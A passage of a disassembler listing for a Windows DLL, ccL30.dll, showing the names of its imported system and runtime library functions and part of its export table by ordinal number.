		db 'InterlockedIncrement',0
		align 4
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .rdata:6AF64A0Co
		align 2
word_6AF65836	dw 2B2h			; DATA XREF: .rdata:off_6AF64E34o
		db 'UnregisterClassA',0
		align 2
word_6AF6584A	dw 2D5h			; DATA XREF: .rdata:6AF64E38o
		db 'wsprintfA',0
word_6AF65856	dw 2Ah			; DATA XREF: .rdata:6AF64E3Co
		db 'CharNextA',0
word_6AF65862	dw 2Dh			; DATA XREF: .rdata:6AF64E80o
		db 'CharPrevA',0
word_6AF6586E	dw 204h			; DATA XREF: .rdata:6AF64E7Co
		db 'PostThreadMessageA',0
		align 4
word_6AF65884	dw 201h			; DATA XREF: .rdata:6AF64E78o
		db 'PostMessageA',0
		align 4
word_6AF65894	dw 99h			; DATA XREF: .rdata:6AF64E74o
		db 'DestroyWindow',0
word_6AF658A4	dw 0A1h			; DATA XREF: .rdata:6AF64E70o
		db 'DispatchMessageA',0
		align 4
word_6AF658B8	dw 2A9h			; DATA XREF: .rdata:6AF64E6Co
		db 'TranslateMessage',0
		align 4
word_6AF658CC	dw 13Ah			; DATA XREF: .rdata:6AF64E68o
		db 'GetMessageA',0
word_6AF658DA	dw 27Fh			; DATA XREF: .rdata:6AF64E40o
		db 'SetWindowLongA',0
		align 4
word_6AF658EC	dw 8Eh			; DATA XREF: .rdata:6AF64E64o
		db 'DefWindowProcA',0
		align 2
word_6AF658FE	dw 16Eh			; DATA XREF: .rdata:6AF64E60o
		db 'GetWindowLongA',0
		align 10h
word_6AF65910	dw 60h			; DATA XREF: .rdata:6AF64E5Co
		db 'CreateWindowExA',0
word_6AF65922	dw 216h			; DATA XREF: .rdata:6AF64E58o
		db 'RegisterClassExA',0
		align 2
word_6AF65936	dw 0F7h			; DATA XREF: .rdata:6AF64E54o
		db 'GetClassInfoExA',0
word_6AF65948	dw 15Dh			; DATA XREF: .rdata:6AF64E50o
		db 'GetSystemMetrics',0
		align 4
word_6AF6595C	dw 203h			; DATA XREF: .rdata:6AF64E4Co
		db 'PostQuitMessage',0
word_6AF6596E	dw 1EDh			; DATA XREF: .rdata:6AF64E48o
		db 'MsgWaitForMultipleObjectsEx',0
word_6AF6598C	dw 1FFh			; DATA XREF: .rdata:6AF64E44o
		db 'PeekMessageA',0
		align 4
aUser32_dll	db 'USER32.dll',0       ; DATA XREF: .rdata:6AF64A20o
		align 4
word_6AF659A8	dw 0C4h			; DATA XREF: .rdata:off_6AF64E0Co
		db 'SHGetSpecialFolderPathA',0
aShell32_dll	db 'SHELL32.dll',0      ; DATA XREF: .rdata:6AF64A34o
word_6AF659CE	dw 0F2h			; DATA XREF: .rdata:6AF64F1Co
		db 'OleLoadFromStream',0
word_6AF659E2	dw 82h			; DATA XREF: .rdata:off_6AF64F04o
		db 'CreateStreamOnHGlobal',0
word_6AF659FA	dw 91h			; DATA XREF: .rdata:6AF64F08o
		db 'GetHGlobalFromStream',0
		align 2
word_6AF65A12	dw 0FEh			; DATA XREF: .rdata:6AF64F0Co
		db 'OleSaveToStream',0
word_6AF65A24	dw 3Bh			; DATA XREF: .rdata:6AF64F10o
		db 'CoInitializeEx',0
		align 2
word_6AF65A36	dw 68h			; DATA XREF: .rdata:6AF64F14o
		db 'CoUninitialize',0
		align 4
word_6AF65A48	dw 10h			; DATA XREF: .rdata:6AF64F18o
		db 'CoCreateInstance',0
		align 4
aOle32_dll	db 'ole32.dll',0        ; DATA XREF: .rdata:6AF64A48o
aOleaut32_dll	db 'OLEAUT32.dll',0     ; DATA XREF: .rdata:6AF64A5Co
		align 4
word_6AF65A74	dw 151h			; DATA XREF: .rdata:6AF64CE8o
		db '??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@Q'
		db 'AE@ABV01@@Z',0
		align 4
word_6AF65AC4	dw 21Fh			; DATA XREF: .rdata:6AF64CE4o
		db '??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@Q'
		db 'AE@XZ',0
		align 2
word_6AF65B0E	dw 158h			; DATA XREF: .rdata:6AF64CE0o
		db '??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@Q'
		db 'AE@PBD@Z',0
word_6AF65B5A	dw 0AA1h		; DATA XREF: .rdata:off_6AF64CDCo
		db '?sync_with_stdio@ios_base@std@@SA_N_N@Z',0
aMsvcp71_dll	db 'MSVCP71.dll',0      ; DATA XREF: .rdata:6AF64A70o
word_6AF65B90	dw 4DAh			; DATA XREF: .rdata:6AF64CECo
		db '?_Nomemory@std@@YAXXZ',0
word_6AF65BA8	dw 66h			; DATA XREF: .rdata:6AF64E24o
		db 'PathRemoveBackslashA',0
		align 10h
word_6AF65BC0	dw 10Dh			; DATA XREF: .rdata:6AF64E20o
		db 'StrTrimA',0
		align 4
word_6AF65BCC	dw 74h			; DATA XREF: .rdata:6AF64E1Co
		db 'PathSkipRootA',0
word_6AF65BDC	dw 50h			; DATA XREF: .rdata:6AF64E28o
		db 'PathIsUNCA',0
		align 2
word_6AF65BEA	dw 14h			; DATA XREF: .rdata:off_6AF64E14o
		db 'PathAddBackslashA',0
word_6AF65BFE	dw 8Dh			; DATA XREF: .rdata:6AF64E2Co
		db 'SHDeleteKeyA',0
		align 2
word_6AF65C0E	dw 8Bh			; DATA XREF: .rdata:6AF64E18o
		db 'SHDeleteEmptyKeyA',0
aShlwapi_dll	db 'SHLWAPI.dll',0      ; DATA XREF: .rdata:6AF64A84o
word_6AF65C2E	dw 2DFh			; DATA XREF: .rdata:6AF64D88o
		db 'malloc',0
		align 4
word_6AF65C38	dw 2ACh			; DATA XREF: .rdata:6AF64D84o
		db 'free',0
		align 10h
word_6AF65C40	dw 0F1h			; DATA XREF: .rdata:6AF64D80o
		db '_except_handler3',0
		align 4
word_6AF65C54	dw 44h			; DATA XREF: .rdata:6AF64D7Co
		db '_CxxThrowException',0
		align 2
word_6AF65C6A	dw 2E7h			; DATA XREF: .rdata:6AF64D74o
		db 'memset',0
		align 4
word_6AF65C74	dw 51h			; DATA XREF: .rdata:6AF64D70o
		db '__CxxFrameHandler',0
word_6AF65C88	dw 12h			; DATA XREF: .rdata:6AF64D6Co
		db '??3@YAXPAX@Z',0
		align 4
word_6AF65C98	dw 0Fh			; DATA XREF: .rdata:6AF64D68o
		db '??1exception@@UAE@XZ',0
		align 10h
word_6AF65CB0	dw 0Bh			; DATA XREF: .rdata:6AF64D64o
		db '??0exception@@QAE@XZ',0
		align 4
word_6AF65CC8	dw 192h			; DATA XREF: .rdata:6AF64D60o
		db '_mbsinc',0
word_6AF65CD2	dw 190h			; DATA XREF: .rdata:6AF64D5Co
		db '_mbsicmp',0
		align 2
word_6AF65CDE	dw 223h			; DATA XREF: .rdata:6AF64D58o
		db '_vscprintf',0
		align 4
word_6AF65CEC	dw 32Ah			; DATA XREF: .rdata:6AF64D54o
		db 'vsprintf',0
		align 4
word_6AF65CF8	dw 2E5h			; DATA XREF: .rdata:6AF64D04o
		db 'memcpy',0
		align 2
word_6AF65D02	dw 2E6h			; DATA XREF: .rdata:6AF64D98o
		db 'memmove',0
word_6AF65D0C	dw 30Ch			; DATA XREF: .rdata:6AF64D9Co
		db 'strlen',0
		align 2
word_6AF65D16	dw 18Ah			; DATA XREF: .rdata:6AF64D78o
		db '_mbscmp',0
word_6AF65D20	dw 0Ah			; DATA XREF: .rdata:6AF64DA4o
		db '??0exception@@QAE@ABV0@@Z',0
word_6AF65D3C	dw 334h			; DATA XREF: .rdata:6AF64D8Co
		db 'wcslen',0
		align 2
word_6AF65D46	dw 1C5h			; DATA XREF: .rdata:6AF64D90o
		db '_purecall',0
word_6AF65D52	dw 308h			; DATA XREF: .rdata:6AF64DBCo
		db 'strcpy',0
		align 4
word_6AF65D5C	dw 1ADh			; DATA XREF: .rdata:6AF64DB8o
		db '_mbsstr',0
word_6AF65D66	dw 189h			; DATA XREF: .rdata:6AF64DB4o
		db '_mbschr',0
word_6AF65D70	dw 1ABh			; DATA XREF: .rdata:6AF64DB0o
		db '_mbsspn',0
word_6AF65D7A	dw 18Dh			; DATA XREF: .rdata:6AF64DACo
		db '_mbscspn',0
		align 2
word_6AF65D86	dw 29Ah			; DATA XREF: .rdata:6AF64DA8o
		db 'fclose',0
		align 10h
word_6AF65D90	dw 143h			; DATA XREF: .rdata:6AF64D50o
		db '_iob',0
		align 4
word_6AF65D98	dw 0FEh			; DATA XREF: .rdata:6AF64D4Co
		db '_fdopen',0
word_6AF65DA2	dw 1BAh			; DATA XREF: .rdata:6AF64D48o
		db '_open_osfhandle',0
word_6AF65DB4	dw 303h			; DATA XREF: .rdata:6AF64DA0o
		db 'sscanf',0
		align 2
word_6AF65DBE	dw 1F5h			; DATA XREF: .rdata:6AF64D40o
		db '_splitpath',0
		align 4
word_6AF65DCC	dw 2E4h			; DATA XREF: .rdata:6AF64D3Co
		db 'memcmp',0
		align 2
word_6AF65DD6	dw 32h			; DATA XREF: .rdata:6AF64D38o
		db '?what@exception@@UBEPBDXZ',0
word_6AF65DF2	dw 9			; DATA XREF: .rdata:6AF64D34o
		db '??0exception@@QAE@ABQBD@Z',0
word_6AF65E0E	dw 20h			; DATA XREF: .rdata:6AF64D30o
		db '??_V@YAXPAX@Z',0
word_6AF65E1E	dw 24h			; DATA XREF: .rdata:6AF64D2Co
		db '?_set_new_mode@@YAHH@Z',0
		align 4
word_6AF65E38	dw 23h			; DATA XREF: .rdata:6AF64D28o
		db '?_set_new_handler@@YAP6AHI@ZP6AHI@Z@Z',0
word_6AF65E60	dw 1DDh			; DATA XREF: .rdata:6AF64D24o
		db '_set_purecall_handler',0
word_6AF65E78	dw 1DFh			; DATA XREF: .rdata:6AF64D20o
		db '_set_security_error_handler',0
word_6AF65E96	dw 9Bh			; DATA XREF: .rdata:6AF64D1Co
		db '__security_error_handler',0
		align 2
word_6AF65EB2	dw 0ECh			; DATA XREF: .rdata:6AF64D18o
		db '_endthreadex',0
		align 2
word_6AF65EC2	dw 19Ah			; DATA XREF: .rdata:6AF64D14o
		db '_mbsnbicmp',0
		align 10h
word_6AF65ED0	dw 0C9h			; DATA XREF: .rdata:6AF64D10o
		db '_beginthreadex',0
		align 2
word_6AF65EE2	dw 0CCh			; DATA XREF: .rdata:6AF64D0Co
		db '_callnewh',0
word_6AF65EEE	dw 6Bh			; DATA XREF: .rdata:6AF64D08o
		db '__dllonexit',0
word_6AF65EFC	dw 1B8h			; DATA XREF: .rdata:6AF64D00o
		db '_onexit',0
aMsvcr71_dll	db 'MSVCR71.dll',0      ; DATA XREF: .rdata:6AF64A98o
word_6AF65F12	dw 10h			; DATA XREF: .rdata:6AF64CFCo
		db '??1type_info@@UAE@XZ',0
		align 2
word_6AF65F2A	dw 2Eh			; DATA XREF: .rdata:6AF64CF8o
		db '?terminate@@YAXXZ',0
word_6AF65F3E	dw 13Fh			; DATA XREF: .rdata:off_6AF64CF4o
		db '_initterm',0
word_6AF65F4A	dw 0BBh			; DATA XREF: .rdata:6AF64D44o
		db '_adjust_fdiv',0
		align 2
word_6AF65F5A	dw 4Ch			; DATA XREF: .rdata:6AF64D94o
		db '__CppXcptFilter',0
word_6AF65F6C	dw 13h			; DATA XREF: .rdata:6AF64EA4o
		db 'WSAConnect',0
		align 2
word_6AF65F7A	dw 5			; DATA XREF: .rdata:6AF64EACo
		db 'WSAAccept',0
word_6AF65F86	dw 34h			; DATA XREF: .rdata:6AF64EB0o
		db 'WSARecv',0
word_6AF65F90	dw 1Eh			; DATA XREF: .rdata:6AF64EB4o
		db 'WSAGetOverlappedResult',0
		align 2
word_6AF65FAA	dw 39h			; DATA XREF: .rdata:6AF64EB8o
		db 'WSASend',0
word_6AF65FB4	dw 41h			; DATA XREF: .rdata:6AF64EECo
		db 'WSASocketA',0
		align 2
aWs2_32_dll	db 'WS2_32.dll',0       ; DATA XREF: .rdata:6AF64AACo
		align 2
word_6AF65FCE	dw 0Ah			; DATA XREF: .rdata:6AF64E8Co
		db 'VerQueryValueA',0
		align 10h
word_6AF65FE0	dw 0			; DATA XREF: .rdata:6AF64E90o
		db 'GetFileVersionInfoA',0
word_6AF65FF6	dw 1			; DATA XREF: .rdata:off_6AF64E88o
		db 'GetFileVersionInfoSizeA',0
aVersion_dll	db 'VERSION.dll',0      ; DATA XREF: .rdata:6AF64AC0o
word_6AF6601C	dw 20Ah			; DATA XREF: .rdata:6AF64CC8o
		db 'HeapDestroy',0
word_6AF6602A	dw 0AFh			; DATA XREF: .rdata:6AF64CCCo
		db 'ExitProcess',0
word_6AF66038	dw 299h			; DATA XREF: .rdata:6AF64CD0o
		db 'QueryPerformanceCounter',0
word_6AF66052	dw 1C0h			; DATA XREF: .rdata:6AF64CD4o
		db 'GetSystemTimeAsFileTime',0
		align 10h
;
; Export directory for ccL30.dll
;
		dd 0			; Characteristics
		dd 41301957h		; TimeDateStamp: Sat Aug 28 01:34:15 2004
		dw 0			; MajorVersion
		dw 0			; MinorVersion
		dd rva aCcl30_dll	; Name
		dd 80h			; Base
		dd 587h			; NumberOfFunctions
		dd 0			; NumberOfNames
		dd rva off_6AF66098	; AddressOfFunctions
		dd rva aCcl30_dll	; AddressOfNames
		dd rva aCcl30_dll	; AddressOfNameOrdinals
;
; Export Address Table for ccL30.dll
;
off_6AF66098	dd rva Ordinal128, rva Ordinal129, rva Ordinal130, rva Ordinal131
					; DATA XREF: .rdata:6AF6608Co
		dd rva Ordinal132, rva Ordinal133, rva Ordinal134, rva Ordinal135
		dd rva Ordinal136, rva Ordinal137, rva Ordinal138, rva Ordinal139
		dd rva Ordinal140, rva Ordinal141, rva Ordinal142, rva Ordinal143
		dd rva Ordinal144, rva Ordinal145, rva Ordinal146, rva Ordinal147
		dd rva Ordinal148, rva Ordinal149, rva Ordinal150, rva Ordinal151
		dd rva Ordinal152, rva Ordinal153, rva Ordinal154, rva Ordinal155
		dd rva Ordinal156, rva Ordinal157, rva Ordinal158, rva Ordinal159
		dd rva Ordinal160, rva Ordinal161, rva Ordinal162, rva Ordinal163
		dd rva Ordinal164, rva Ordinal165, rva Ordinal166, rva Ordinal167
		dd rva Ordinal168, rva Ordinal169, rva Ordinal170, rva Ordinal171
		dd rva Ordinal172, rva Ordinal173, rva Ordinal174, rva Ordinal175
		dd rva Ordinal176, rva Ordinal177, rva Ordinal178, rva Ordinal179
		dd rva Ordinal180, rva Ordinal181, rva Ordinal182, rva Ordinal183
		dd rva Ordinal184, rva Ordinal185, rva Ordinal186, rva Ordinal187
		dd rva Ordinal188, rva Ordinal189, rva Ordinal190, rva Ordinal191
		dd rva Ordinal192, rva Ordinal193, rva Ordinal194, rva Ordinal195
		dd rva Ordinal196, rva Ordinal197, rva Ordinal198, rva Ordinal199
		dd rva Ordinal200, rva Ordinal201, rva Ordinal202, rva Ordinal203
		dd rva Ordinal204, rva Ordinal205, rva Ordinal206, rva Ordinal207
		dd rva Ordinal208, rva Ordinal209, rva Ordinal210, rva Ordinal211
		dd rva Ordinal212, rva Ordinal213, rva Ordinal214, rva Ordinal215
		dd rva Ordinal216, rva Ordinal217, rva Ordinal218, rva Ordinal219
		dd rva Ordinal220, rva Ordinal221, rva Ordinal222, rva Ordinal223
		dd rva Ordinal224, rva Ordinal225, rva Ordinal226, rva Ordinal227
		dd rva Ordinal228, rva Ordinal229, rva Ordinal230, rva Ordinal1118
		dd rva Ordinal232, rva Ordinal233, rva Ordinal234, rva Ordinal235
		dd rva Ordinal236, rva Ordinal237, rva Ordinal238, rva Ordinal239
		dd rva Ordinal240, rva Ordinal241, rva Ordinal242, rva Ordinal243
		dd rva Ordinal244, rva Ordinal245, rva Ordinal246, rva Ordinal247
		dd rva Ordinal248, rva Ordinal249, rva Ordinal250, rva Ordinal251
		dd rva Ordinal252, rva Ordinal253, rva Ordinal370, rva Ordinal255
		dd rva Ordinal256, rva Ordinal257, rva Ordinal258, rva Ordinal259
		dd rva Ordinal260, rva Ordinal261, rva Ordinal262, rva Ordinal263
		dd rva Ordinal264, rva Ordinal265, rva Ordinal266, rva Ordinal267
		dd rva Ordinal268, rva Ordinal269, rva Ordinal270, rva Ordinal271
		dd rva Ordinal272, rva Ordinal273, rva Ordinal274, rva Ordinal275
		dd rva Ordinal276, rva Ordinal277, rva Ordinal278, rva Ordinal279
		dd rva Ordinal280, rva Ordinal281, rva Ordinal282, rva Ordinal283
		dd rva Ordinal284, rva Ordinal285, rva Ordinal286, rva Ordinal287
		dd rva Ordinal288, rva Ordinal289, rva Ordinal290, rva Ordinal291
		dd rva Ordinal292, rva Ordinal293, rva Ordinal294, rva Ordinal295
		dd rva Ordinal296, rva Ordinal297, rva Ordinal298, rva Ordinal299
		dd rva Ordinal300, rva Ordinal301, rva Ordinal302, rva Ordinal303
		dd rva Ordinal766, rva Ordinal1176, rva	Ordinal306, rva	Ordinal307
		dd rva Ordinal308, rva Ordinal309, rva Ordinal310, rva Ordinal311
		dd rva Ordinal312, rva Ordinal313, rva Ordinal314, rva Ordinal315
		dd rva Ordinal316, rva Ordinal317, rva Ordinal318, rva Ordinal319
		dd rva Ordinal320, rva Ordinal321, rva Ordinal322, rva Ordinal323
		dd rva Ordinal324, rva Ordinal325, rva Ordinal326, rva Ordinal327
		dd rva Ordinal328, rva Ordinal329, rva Ordinal330, rva Ordinal331
		dd rva Ordinal332, rva Ordinal333, rva Ordinal334, rva Ordinal335
		dd rva Ordinal336, rva Ordinal337, rva Ordinal338, rva Ordinal339
		dd rva Ordinal340, rva Ordinal341, rva Ordinal342, rva Ordinal343
		dd rva Ordinal344, rva Ordinal345, rva Ordinal346, rva Ordinal347
		dd rva Ordinal348, rva Ordinal349, rva Ordinal350, rva Ordinal351
		dd rva Ordinal352, rva Ordinal353, rva Ordinal354, rva Ordinal355
		dd rva Ordinal356, rva Ordinal357, rva Ordinal358, rva Ordinal359
		dd rva Ordinal360, rva Ordinal361, rva Ordinal362, rva Ordinal363
		dd rva Ordinal364, rva Ordinal766, rva Ordinal366, rva Ordinal367
		dd rva Ordinal368, rva Ordinal369, rva Ordinal370, rva Ordinal371
		dd rva Ordinal372, rva Ordinal373, rva Ordinal374, rva Ordinal375
		dd rva Ordinal376, rva Ordinal377, rva Ordinal378, rva Ordinal379
		dd rva Ordinal380, rva Ordinal381, rva Ordinal382, rva Ordinal383
		dd rva Ordinal384, rva Ordinal385, rva Ordinal386, rva Ordinal387
		dd rva Ordinal388, rva Ordinal389, rva Ordinal390, rva Ordinal391
		dd rva Ordinal392, rva Ordinal393, rva Ordinal394, rva Ordinal395
		dd rva Ordinal396, rva Ordinal397, rva Ordinal398, rva Ordinal399
		dd rva Ordinal400, rva Ordinal401, rva Ordinal402, rva Ordinal403
		dd rva Ordinal404, rva Ordinal405, rva Ordinal406, rva Ordinal407
		dd rva Ordinal408, rva Ordinal409, rva Ordinal410, rva Ordinal411
		dd rva Ordinal412, rva Ordinal413, rva Ordinal414, rva Ordinal415
		dd rva Ordinal416, rva Ordinal417, rva Ordinal418, rva Ordinal419
		dd rva Ordinal420, rva Ordinal421, rva Ordinal422, rva Ordinal423
		dd rva Ordinal424, rva Ordinal425, rva Ordinal426, rva Ordinal427
		dd rva Ordinal428, rva Ordinal429, rva Ordinal430, rva Ordinal431
		dd rva Ordinal432, rva Ordinal433, rva Ordinal434, rva Ordinal435
		dd 2 dup(rva Ordinal437), rva Ordinal438, rva Ordinal439
		dd rva Ordinal440, rva Ordinal441, rva Ordinal442, rva Ordinal443
		dd rva Ordinal444, rva Ordinal445, rva Ordinal446, rva Ordinal447
		dd rva Ordinal448, rva Ordinal449, rva Ordinal450, rva Ordinal451
		dd rva Ordinal452, rva Ordinal453, rva Ordinal454, rva Ordinal455
		dd rva Ordinal456, rva Ordinal457, rva Ordinal458, rva Ordinal459
		dd rva Ordinal460, rva Ordinal461, rva Ordinal462, rva Ordinal463
		dd rva Ordinal464, rva Ordinal465, rva Ordinal466, rva Ordinal467
		dd rva Ordinal468, rva Ordinal469, rva Ordinal470, rva Ordinal471
		dd rva Ordinal472, rva Ordinal473, rva Ordinal474, rva Ordinal475
		dd rva Ordinal476, rva Ordinal477, rva Ordinal478, rva Ordinal479
		dd rva Ordinal480, rva Ordinal481, rva Ordinal482, rva Ordinal483
		dd rva Ordinal484, rva Ordinal485, rva Ordinal486, 5 dup(rva Ordinal490)
		dd rva Ordinal1091, 4 dup(rva Ordinal495), rva Ordinal497
		dd rva Ordinal498, rva Ordinal499, rva Ordinal500, rva Ordinal501
		dd rva Ordinal502, rva Ordinal236, rva Ordinal504, rva Ordinal505
		dd rva Ordinal506, rva Ordinal507, rva Ordinal508, rva Ordinal509
		dd rva Ordinal510, rva Ordinal511, rva Ordinal512, rva Ordinal513
		dd rva Ordinal514, rva Ordinal515, rva Ordinal516, rva Ordinal517
		dd rva Ordinal518, rva Ordinal519, rva Ordinal520, rva Ordinal521
		dd rva Ordinal522, rva Ordinal523, rva Ordinal524, rva Ordinal525
		dd rva Ordinal526, rva Ordinal527, rva Ordinal528, rva Ordinal529
		dd rva Ordinal530, rva Ordinal531, rva Ordinal532, rva Ordinal533
		dd rva Ordinal534, rva Ordinal535, rva Ordinal536, rva Ordinal537
		dd rva Ordinal538, rva Ordinal539, rva Ordinal540, rva Ordinal541
		dd rva Ordinal542, rva Ordinal543, rva Ordinal544, rva Ordinal545
		dd rva Ordinal546, rva Ordinal547, rva Ordinal548, rva Ordinal549
		dd rva Ordinal550, rva Ordinal551, rva Ordinal552, rva Ordinal553
		dd rva Ordinal554, rva Ordinal555, rva Ordinal556, rva Ordinal557
		dd rva Ordinal558, rva Ordinal559, rva Ordinal560, rva Ordinal561
		dd rva Ordinal562, rva Ordinal563, rva Ordinal564, rva Ordinal565
		dd rva Ordinal566, rva Ordinal567, rva Ordinal568, rva Ordinal569
		dd rva Ordinal570, rva Ordinal571, rva Ordinal572, rva Ordinal573
		dd rva Ordinal574, rva Ordinal575, rva Ordinal576, rva Ordinal577
		dd rva Ordinal578, rva Ordinal579, rva Ordinal580, rva Ordinal581
		dd rva Ordinal582, rva Ordinal583, rva Ordinal584, rva Ordinal585
		dd rva Ordinal586, rva Ordinal587, rva Ordinal588, rva Ordinal589
		dd rva Ordinal590, rva Ordinal591, rva Ordinal592, rva Ordinal593
		dd rva Ordinal594, rva Ordinal595, rva Ordinal596, rva Ordinal597
		dd rva Ordinal598, rva Ordinal599, rva Ordinal600, rva Ordinal601
		dd rva Ordinal602, rva Ordinal603, rva Ordinal604, rva Ordinal605
		dd rva Ordinal606, rva Ordinal607, rva Ordinal608, rva Ordinal609
		dd rva Ordinal610, rva Ordinal611, rva Ordinal612, rva Ordinal613
		dd rva Ordinal614, rva Ordinal615, rva Ordinal616, rva Ordinal617
		dd rva Ordinal618, rva Ordinal619, rva Ordinal620, rva Ordinal621
		dd rva Ordinal622, rva Ordinal623, rva Ordinal624, rva Ordinal1118
		dd rva Ordinal626, rva Ordinal627, rva Ordinal628, rva Ordinal629
		dd rva Ordinal1064, rva	Ordinal631, rva	Ordinal632, rva	Ordinal1064
		dd rva Ordinal634, rva Ordinal635, rva Ordinal636, rva Ordinal637
		dd rva Ordinal638, rva Ordinal639, rva Ordinal640, rva Ordinal641
		dd rva Ordinal642, rva Ordinal643, rva Ordinal644, rva Ordinal645
		dd rva Ordinal646, rva Ordinal647, rva Ordinal648, rva Ordinal649
		dd rva Ordinal1118, rva	Ordinal651, rva	Ordinal534, rva	Ordinal653
		dd rva Ordinal1173, rva	Ordinal655, rva	Ordinal1174, rva Ordinal657
		dd rva Ordinal658, rva Ordinal659, rva Ordinal1176, rva	Ordinal661
		dd rva Ordinal766, rva Ordinal663, rva Ordinal1171, rva	Ordinal665
		dd rva Ordinal1172, rva	Ordinal667, rva	Ordinal236, rva	Ordinal669
		dd rva Ordinal865, rva Ordinal671, rva Ordinal672, rva Ordinal673
		dd rva Ordinal674, rva Ordinal675, rva Ordinal676, rva Ordinal677
		dd rva Ordinal678, rva Ordinal679, rva Ordinal680, rva Ordinal681
		dd 3 dup(rva Ordinal684), rva Ordinal685, rva Ordinal686
		dd rva Ordinal687, rva Ordinal688, rva Ordinal236, rva Ordinal690
		dd rva Ordinal865, 2 dup(rva Ordinal692), rva Ordinal694
		dd rva Ordinal695, rva Ordinal696, rva Ordinal697, rva Ordinal698
		dd rva Ordinal699, rva Ordinal700, rva Ordinal701, rva Ordinal1118
		dd rva Ordinal236, rva Ordinal704, rva Ordinal705, rva Ordinal706
		dd rva Ordinal707, rva Ordinal708, rva Ordinal709, rva Ordinal710
		dd rva Ordinal711, rva Ordinal712, rva Ordinal713, rva Ordinal714
		dd rva Ordinal715, rva Ordinal716, rva Ordinal717, rva Ordinal718
		dd rva Ordinal719, rva Ordinal720, rva Ordinal721, rva Ordinal722
		dd rva Ordinal723, rva Ordinal724, rva Ordinal725, rva Ordinal726
		dd rva Ordinal727, rva Ordinal728, rva Ordinal729, rva Ordinal730
		dd rva Ordinal731, rva Ordinal732, rva Ordinal733, rva Ordinal734
		dd rva Ordinal735, rva Ordinal736, rva Ordinal737, rva Ordinal738
		dd rva Ordinal739, rva Ordinal740, rva Ordinal741, rva Ordinal742
		dd rva Ordinal743, rva Ordinal744, rva Ordinal745, rva Ordinal746
		dd rva Ordinal747, rva Ordinal748, rva Ordinal749, rva Ordinal236
		dd rva Ordinal751, rva Ordinal752, rva Ordinal753, rva Ordinal754
		dd rva Ordinal236, rva Ordinal649, rva Ordinal1118, rva	Ordinal758
		dd rva Ordinal1171, rva	Ordinal760, rva	Ordinal1172, rva Ordinal762
		dd rva Ordinal865, rva Ordinal764, rva Ordinal765, rva Ordinal766
		dd rva Ordinal767, rva Ordinal768, rva Ordinal769, rva Ordinal770
		dd rva Ordinal771, rva Ordinal1118, rva	Ordinal773, rva	Ordinal774
		dd rva Ordinal775, rva Ordinal776, rva Ordinal777, rva Ordinal778
		dd rva Ordinal779, rva Ordinal780, rva Ordinal781, rva Ordinal782
		dd rva Ordinal783, rva Ordinal784, rva Ordinal785, rva Ordinal1137
		dd rva Ordinal787, rva Ordinal788, rva Ordinal789, rva Ordinal790
		dd rva Ordinal791, rva Ordinal792, rva Ordinal236, rva Ordinal794
		dd rva Ordinal795, rva Ordinal796, rva Ordinal797, rva Ordinal798
		dd rva Ordinal799, rva Ordinal1438, rva	Ordinal801, rva	Ordinal802
		dd rva Ordinal803, rva Ordinal1442, rva	Ordinal1443, rva Ordinal1444
		dd rva Ordinal1445, rva	Ordinal808, rva	Ordinal1447, rva Ordinal810
		dd rva Ordinal1449, rva	Ordinal1450, rva Ordinal1451, rva Ordinal1452
		dd rva Ordinal815, rva Ordinal816, rva Ordinal1455, rva	Ordinal1456
		dd rva Ordinal819, rva Ordinal1458, rva	Ordinal1459, rva Ordinal1460
		dd rva Ordinal823, rva Ordinal824, rva Ordinal825, rva Ordinal826
		dd rva Ordinal827, rva Ordinal828, rva Ordinal829, rva Ordinal830
		dd rva Ordinal831, rva Ordinal832, rva Ordinal833, rva Ordinal834
		dd rva Ordinal835, rva Ordinal836, rva Ordinal837, rva Ordinal838
		dd rva Ordinal1118, rva	Ordinal840, rva	Ordinal841, rva	Ordinal842
		dd rva Ordinal843, rva Ordinal844, rva Ordinal845, rva Ordinal846
		dd rva Ordinal847, rva Ordinal1062, rva	Ordinal849, rva	Ordinal1064
		dd rva Ordinal1065, rva	Ordinal852, rva	Ordinal853, rva	Ordinal854
		dd rva Ordinal855, rva Ordinal856, rva Ordinal857, rva Ordinal858
		dd rva Ordinal859, rva Ordinal860, rva Ordinal861, rva Ordinal862
		dd rva Ordinal863, rva Ordinal864, 2 dup(rva Ordinal865)
		dd rva Ordinal867, rva Ordinal868, rva Ordinal869, rva Ordinal870
		dd rva Ordinal871, rva Ordinal872, rva Ordinal873, rva Ordinal874
		dd rva Ordinal875, rva Ordinal876, rva Ordinal877, rva Ordinal236
		dd rva Ordinal865, rva Ordinal1118, rva	Ordinal881, rva	Ordinal882
		dd rva Ordinal883, rva Ordinal884, rva Ordinal1435, rva	Ordinal886
		dd rva Ordinal887, rva Ordinal888, rva Ordinal889, rva Ordinal890
		dd rva Ordinal891, rva Ordinal892, rva Ordinal1118, rva	Ordinal894
		dd rva Ordinal895, rva Ordinal896, rva Ordinal897, rva Ordinal898
		dd rva Ordinal899, rva Ordinal753, rva Ordinal901, rva Ordinal902
		dd rva Ordinal903, rva Ordinal904, rva Ordinal905, rva Ordinal906
		dd rva Ordinal907, rva Ordinal908, rva Ordinal909, rva Ordinal910
		dd rva Ordinal766, rva Ordinal912, rva Ordinal865, rva Ordinal914
		dd rva Ordinal915, rva Ordinal766, rva Ordinal1176, rva	Ordinal918
		dd rva Ordinal919, rva Ordinal920, rva Ordinal921, rva Ordinal922
		dd rva Ordinal923, rva Ordinal924, rva Ordinal925, rva Ordinal926
		dd rva Ordinal927, rva Ordinal928, rva Ordinal929, rva Ordinal930
		dd rva Ordinal931, rva Ordinal932, rva Ordinal933, rva Ordinal934
		dd rva Ordinal935, rva Ordinal936, rva Ordinal937, rva Ordinal938
		dd rva Ordinal939, rva Ordinal940, rva Ordinal941, rva Ordinal942
		dd rva Ordinal943, rva Ordinal944, rva Ordinal945, rva Ordinal946
		dd rva Ordinal947, rva Ordinal948, rva Ordinal949, rva Ordinal950
		dd rva Ordinal951, rva Ordinal952, rva Ordinal953, rva Ordinal954
		dd rva Ordinal955, rva Ordinal956, rva Ordinal957, rva Ordinal958
		dd rva Ordinal959, rva Ordinal960, rva Ordinal961, rva Ordinal962
		dd rva Ordinal963, rva Ordinal964, rva Ordinal965, rva Ordinal966
		dd rva Ordinal967, rva Ordinal968, rva Ordinal969, rva Ordinal970
		dd rva Ordinal971, rva Ordinal972, rva Ordinal973, rva Ordinal974
